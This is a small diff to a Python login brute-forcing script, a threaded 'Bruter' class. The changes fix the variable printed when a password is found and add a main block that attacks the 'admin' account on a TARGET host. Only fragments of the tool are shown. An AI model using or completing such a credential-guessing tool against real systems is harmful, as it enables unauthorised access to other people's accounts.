@@ -2,8 +2,7 @@ from io import BytesIO
 from lxml import etree
 from queue import Queue
 
-import requests
-import sys 
+import requests 
 import threading
 import time
 
@@ -61,6 +60,10 @@ class Bruter:
                 self.found = True
                 print(f"\nBruteforcing successful.")
                 print("Username is %s" % self.username)
-                print("Password is %s\n" % brute)
+                print("Password is %s\n" % passwd)
                 print('done: now cleaning up other threads...')
 
+if __name__ == '__main__':
+    words = get_words()
+    b = Bruter('admin', TARGET)
+    b.run_bruteforce(words)
